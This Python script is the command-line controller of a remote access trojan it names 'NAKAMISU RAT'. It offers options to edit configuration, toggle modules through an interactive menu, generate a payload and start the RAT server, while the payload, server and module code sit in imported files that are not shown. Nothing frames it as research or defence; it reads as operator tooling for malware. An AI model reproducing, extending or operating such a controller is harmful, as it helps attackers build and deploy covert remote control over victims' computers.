#!/usr/bin/env python3
import sys
import os
import argparse
from settings import Settings
from rat import RATServer
from generator import generate_payload

def main():
    parser = argparse.ArgumentParser(description="NAKAMISU RAT Controller")
    parser.add_argument("--config", nargs="+", help="Set config key=value pairs")
    parser.add_argument("--settings", action="store_true", help="Interactive settings menu")
    parser.add_argument("--generate", action="store_true", help="Generate payload")
    parser.add_argument("--server", action="store_true", help="Start RAT server")
    parser.add_argument("--show-config", action="store_true", help="Show current configuration")
    parser.add_argument("--module", nargs=2, metavar=('NAME', 'on/off'), help="Enable/disable module")
    args = parser.parse_args()

    settings = Settings()

    if args.config:
        for item in args.config:
            if '=' in item:
                key, val = item.split('=', 1)
                # Type guessing
                if val.lower() in ['true', 'false']:
                    val = val.lower() == 'true'
                elif val.isdigit():
                    val = int(val)
                settings.set(key, val)
        print("[+] Configuration updated.")

    if args.module:
        name, state = args.module
        active = state.lower() in ['on', 'true', '1', 'yes']
        if settings.set_module_active(name, active):
            print(f"[+] Module {name} set to {'active' if active else 'inactive'}")
        else:
            print(f"[-] Module {name} not found")

    if args.settings:
        while True:
            print("\n" + "="*50)
            print("NAKAMISU Settings Menu")
            print("="*50)
            print("1. View config")
            print("2. Edit config")
            print("3. View modules")
            print("4. Toggle module")
            print("5. Save and exit")
            choice = input("> ").strip()
            if choice == '1':
                settings.show_config()
            elif choice == '2':
                key = input("Enter config key: ").strip()
                if key in settings.config:
                    print(f"Current value: {settings.config[key]}")
                    new_val = input("New value: ").strip()
                    if new_val:
                        # try convert
                        if new_val.lower() in ['true', 'false']:
                            new_val = new_val.lower() == 'true'
                        elif new_val.isdigit():
                            new_val = int(new_val)
                        settings.set(key, new_val)
                else:
                    print("Key not found")
            elif choice == '3':
                for name, data in settings.modules.items():
                    status = "ACTIVE" if data.get("active") else "INACTIVE"
                    print(f"  {name}: {status} - {data.get('description')}")
            elif choice == '4':
                name = input("Module name: ").strip()
                if name in settings.modules:
                    current = settings.modules[name]["active"]
                    new = not current
                    settings.set_module_active(name, new)
                    print(f"{name} set to {'ACTIVE' if new else 'INACTIVE'}")
                else:
                    print("Module not found")
            elif choice == '5':
                break

    if args.show_config:
        settings.show_config()

    if args.generate:
        generate_payload(settings)

    if args.server:
        server = RATServer(settings.config)
        server.start()

if __name__ == "__main__":
    main()
